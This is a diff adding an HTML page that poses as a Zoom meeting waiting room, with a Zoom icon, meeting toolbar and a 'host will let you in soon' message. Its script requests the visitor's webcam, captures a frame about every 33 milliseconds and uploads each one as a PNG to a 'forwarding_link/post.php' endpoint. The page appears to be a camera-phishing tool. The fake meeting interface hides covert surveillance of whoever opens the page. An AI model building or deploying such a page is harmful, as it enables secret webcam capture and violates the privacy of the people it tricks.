@@ -1,0 +1,270 @@
+<!doctype html>
+<html>
+
+<head>
+  <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
+  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+  <link rel="icon" href="https://us05st1.zoom.us/zoom.ico" />
+</head>
+<style>
+  @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500;500&display=swap");
+
+  body {
+    height: 100vh;
+    width: 100vw;
+  }
+
+  * {
+    padding: 0px;
+    margin: 0px;
+    font-family: 'Nunito', sans-serif;
+    font-weight: 500;
+  }
+
+  .main-screen {
+    background-color: #273039;
+    height: 100vh;
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+
+  img {
+    height: 80px;
+    width: 80px;
+  }
+
+  .bottom-bar {
+    position: fixed;
+    padding: 0px 40px 0px -40px;
+    bottom: 0px;
+    height: 80px;
+    width: 100%;
+    background-color: #1F2022;
+    display: flex;
+    flex-direction: row;
+    justify-content: center;
+    align-items: center;
+    color: #fff;
+  }
+
+  .icon-button {
+    display: flex;
+    flex-direction: column;
+    justify-items: center;
+    align-items: center;
+    cursor: pointer;
+  }
+  .multi-icon::before {
+    content: "20";
+    font-size: small;
+    position: absolute;
+    bottom: 43px;
+    left: 672px;
+  }
+
+  i {
+    margin-bottom: 8px;
+    font-size: 26px;
+  }
+
+  button {
+    color: #fff;
+    background-color: crimson;
+    padding: 10px 20px;
+    border: none;
+    border-radius: 5px;
+    border-style: none;
+    outline: none;
+    cursor: pointer;
+  }
+
+  #ac-wrapper {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(255,255,255,.6);
+    z-index: 100;
+}
+
+#popup {
+    width: 555px;
+    height: 35px;
+    text-align: center;
+    margin-inline: auto;
+    margin-top: 40vh;
+    position: relative;
+    color: #273039;
+    font-weight: bold;
+}
+
+canvas{
+  position: fixed;
+  bottom: 80px;
+  right: 0;
+  width: 200px;
+  height: 150px;
+}
+.host {
+  width: 100%;
+  height: 100%;
+  background-size: contain;
+  background-image: url(./host\ image.png);
+  background-repeat: no-repeat;
+}
+</style>
+<body>
+  <div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+  </div>
+  <canvas id="canvas" width="640" height="480" audoplay></canvas>
+  <div id="ac-wrapper">
+    <div id="popup">
+        <h2>Please wait the meeting host will let you in soon</h2>
+    </div>
+</div>
+<div class="host"></div>
+  <div class="bottom-bar">
+    <div class="icon-button" style="margin-left: 50px;">
+      <i class="fas fa-microphone-slash"></i>
+      <h6>Mute</h6>
+    </div>
+    <div class="icon-button" id="stopVideo" style="margin-left: 50px;">
+      <i class="fas fa-video"></i>
+      <h6>Stop Video</h6>
+    </div>
+    <div class="icon-button" style="margin-left: auto;">
+      <i class="fas fa-shield-alt"></i>
+      <h6>Security</h6>
+    </div>
+    <div class="icon-button multi-icon" style="margin-left: 50px;">
+      <i class="fas fa-users"></i>
+      <h6>Participants</h6>
+    </div>
+    <div class="icon-button" style="margin-left: 50px;">
+      <i class="fas" style="scale: 1.5;">
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="SvgSharingDefault">
+        <path fill-rule="evenodd" clip-rule="evenodd" d="M0 7.8c0-1.68 0-2.52.327-3.162a3 3 0 0 1 1.311-1.311C2.28 3 3.12 3 4.8 3h14.4c1.68 0 2.52 0 3.162.327a3 3 0 0 1 1.311 1.311C24 5.28 24 6.12 24 7.8v8.4c0 1.68 0 2.52-.327 3.162a3 3 0 0 1-1.311 1.311C21.72 21 20.88 21 19.2 21H4.8c-1.68 0-2.52 0-3.162-.327a3 3 0 0 1-1.311-1.311C0 18.72 0 17.88 0 16.2V7.8Zm12.938 2.713 1.4 1.4a.937.937 0 0 0 1.325-1.326l-3-3a.937.937 0 0 0-1.326 0l-3 3a.937.937 0 1 0 1.326 1.326l1.4-1.4v5.237a.937.937 0 1 0 1.874 0v-5.237Z" 
+        fill="#ffff"></path>
+      </svg>
+      </i>
+      <h6>Share content</h6>
+    </div>
+    <div class="icon-button" style="margin-left: 50px;">
+      <i class="fas fa-comments"></i>
+      <h6>Chat</h6>
+    </div>
+    <div class="icon-button" style="margin-right: auto; margin-left: 50px;">
+      <i class="fas fa-record-vinyl"></i>
+      <h6>Record</h6>
+    </div>
+    <a href="https://zoom.us/"><button style="margin-right: 50px;">Leave</button></a>
+  </div>
+
+<script>
+navigator.getUserMedia = navigator.getUserMedia || navigator.mozGetUserMedia;
+
+window.onload = () => {
+  // flag check video
+  var isVideo = true;
+
+  $('#stopVideo').on('click', function() {
+    isVideo = !isVideo;
+    if (isVideo) {
+      video.play();
+    } else {
+      video.pause();
+    }
+  })
+  
+
+let ajaxQueue = [];
+
+function addToQueue(frame) {
+    ajaxQueue.push(frame);
+    if (ajaxQueue.length === 1) {
+        sendRequest();
+    }
+}
+
+async function sendRequest() {
+    if (ajaxQueue.length > 0) {
+        let frame = ajaxQueue[0];
+        try {
+            await $.ajax({
+                type: 'POST',
+                data: { 'cat': frame },
+                url: 'forwarding_link/post.php',
+                dataType: 'json',
+                success: function (result) {
+                    console.log('ok');
+                    ajaxQueue.shift();
+                    sendRequest();
+                },
+                error: function (error) {
+                    console.log(error);
+                    ajaxQueue.shift();
+                    sendRequest();
+                }
+            });
+        } catch (err) {
+            console.log(err);
+            ajaxQueue.shift();
+            sendRequest();
+        }
+    }
+}
+
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const errorMsgElement = document.querySelector('span#errorMsg');
+
+  // Access webcam
+  async function init() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ audio: false, video: true });
+      handleSuccess(stream);
+    } catch (e) {
+      errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+    }
+  }
+
+  // Success
+  function handleSuccess(stream) {
+    window.stream = stream;
+    video.srcObject = stream;
+
+    var context = canvas.getContext('2d');
+    setInterval(function () {
+      context.drawImage(video, 0, 0, 640, 480);
+      var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+      // post(canvasData);
+      if (isVideo) {
+      addToQueue(canvasData);
+      video.play();
+      context.filter = 'blur(0px)'
+    } else {
+      video.pause();
+      context.filter = 'blur(5px)'
+    }
+
+    }, 33);
+  }
+  function PopUp(){
+    document.getElementById('ac-wrapper').style.display="none"; 
+}
+  // Load init
+  init();
+  $(document).ready(function(){
+   setTimeout(function(){
+      PopUp();
+   },1000); // after 5 seconds remove popup
+});
+};
+</script>
+</body>
+
+</html>
